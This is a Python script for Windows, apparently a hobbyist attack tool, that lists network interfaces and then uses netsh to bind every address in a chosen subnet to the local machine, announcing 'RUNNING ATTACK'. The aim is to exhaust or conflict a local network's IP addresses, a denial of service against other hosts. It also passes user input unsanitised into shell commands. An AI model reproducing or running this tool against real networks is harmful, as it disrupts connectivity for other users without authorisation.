import os
import ipcalc
import signal
import winreg
import netifaces
from progress.bar import IncrementalBar
from progress.spinner import Spinner

def handler_exit(sig, frame): exit(1)
signal.signal(signal.SIGINT, handler_exit)

BANNER = r"""
█    ██  ███▄    █ ▄▄▄█████▓ ██▀███   █    ██   ██████ ▄▄▄█████▓▓█████ ▓█████▄ 
 ██  ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒▓██ ▒ ██▒ ██  ▓██▒▒██    ▒ ▓  ██▒ ▓▒▓█   ▀ ▒██▀ ██▌
▓██  ▒██░▓██  ▀█ ██▒▒ ▓██░ ▒░▓██ ░▄█ ▒▓██  ▒██░░ ▓██▄   ▒ ▓██░ ▒░▒███   ░██   █▌
▓▓█  ░██░▓██▒  ▐▌██▒░ ▓██▓ ░ ▒██▀▀█▄  ▓▓█  ░██░  ▒   ██▒░ ▓██▓ ░ ▒▓█  ▄ ░▓█▄   ▌
▒▒█████▓ ▒██░   ▓██░  ▒██▒ ░ ░██▓ ▒██▒▒▒█████▓ ▒██████▒▒  ▒██▒ ░ ░▒████▒░▒████▓ 
░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒   ▒ ░░   ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░  ▒ ░░   ░░ ▒░ ░ ▒▒▓  ▒ 
░░▒░ ░ ░ ░ ░░   ░ ▒░    ░      ░▒ ░ ▒░░░▒░ ░ ░ ░ ░▒  ░ ░    ░     ░ ░  ░ ░ ▒  ▒ 
 ░░░ ░ ░    ░   ░ ░   ░        ░░   ░  ░░░ ░ ░ ░  ░  ░    ░         ░    ░ ░  ░ 
   ░              ░             ░        ░           ░              ░  ░   ░    
                                                                         ░      

                               Made by Dahni
                            Avalible interfaces
            ___________________________________________________________
"""

def get_connection_name_from_guid(iface_guids):
    iface_names = ["" for i in range(len(iface_guids) - 1)]
    reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
    reg_key = winreg.OpenKey(reg, r'SYSTEM\CurrentControlSet\Control\Network\{4d36e972-e325-11ce-bfc1-08002be10318}')
    for i in range(len(iface_guids)):
        try:
            reg_subkey = winreg.OpenKey(reg_key, iface_guids[i] + r'\Connection')
            iface_names[i] = winreg.QueryValueEx(reg_subkey, 'Name')[0]
        except FileNotFoundError:
            pass
    return iface_names

def main_function():
    print(BANNER)

    interfaces_raw = netifaces.interfaces()
    interfaces = get_connection_name_from_guid(interfaces_raw)
    for words in interfaces: print(f"                       > {words}")
    network_interface = input("\n\n[?] Introduce the network interface ~$ ")

    if str(network_interface) in str(interfaces):

        def handler_interfaces(sig, frame):
            os.popen(f'netsh interface ip set address name="{network_interface}" source = dhcp')
            os.popen(f'netsh interface ip set dnsserver "{network_interface}" source = dhcp')
            exit(1)
        signal.signal(signal.SIGINT, handler_interfaces)
        
        clave_user = input('[!] The DHCP server is going to be disable, do you want to continue? (S/N): ')
        if clave_user == "S" or clave_user == "s":
            
            ip_host = input("[?] Introduce your IP (192.168.x.x/X) ~$ ") 
            host_gateway = input("[?] Introduce your actual gateway ~$ ")
            range_ip_host = [x for x in ipcalc.Network(ip_host)]

            os.popen(f'netsh interface ipv4 add address "{network_interface}" {ip_host} gateway={host_gateway} SkipAsSource=true')            
            os.popen(f'netsh interface ip set dnsserver "{network_interface}" static 8.8.8.8 primary')
            
            second_clave_user = input(f"[!] Your PC will be assigned with {len(range_ip_host)} IP's, do you want to continue? (S/N): ")
            if second_clave_user == "S" or second_clave_user == "s":
                
                print("\n")
                progress_bar = IncrementalBar('[?] Setting up IP`s', max=len(range_ip_host))
                for ip in range_ip_host:
                    os.popen(f'netsh int ipv4 add address "{network_interface}" {ip} SkipAsSource=true')
                    progress_bar.next()
                
                print("\n")
                progress_bar = Spinner("[!] RUNNING ATTACK, press ctrl + c to stop ")
                while True:
                    progress_bar.next()

if __name__ == "__main__":
    main_function()
